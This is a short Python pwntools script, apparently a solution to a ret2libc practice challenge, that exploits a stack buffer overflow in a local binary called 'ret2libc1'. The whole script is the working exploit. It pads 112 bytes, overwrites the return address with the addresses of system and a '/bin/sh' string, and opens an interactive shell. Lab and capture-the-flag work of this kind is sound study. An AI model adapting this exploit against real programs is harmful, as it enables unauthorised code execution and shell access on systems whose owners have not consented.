from pwn import *

p = process('./ret2libc1')

system_addr = 0x8048460
binsh_addr = 0x8048720

payload = b'A'*112 + p32(system_addr) + p32(0) + p32(binsh_addr)

p.sendline(payload)
p.interactive()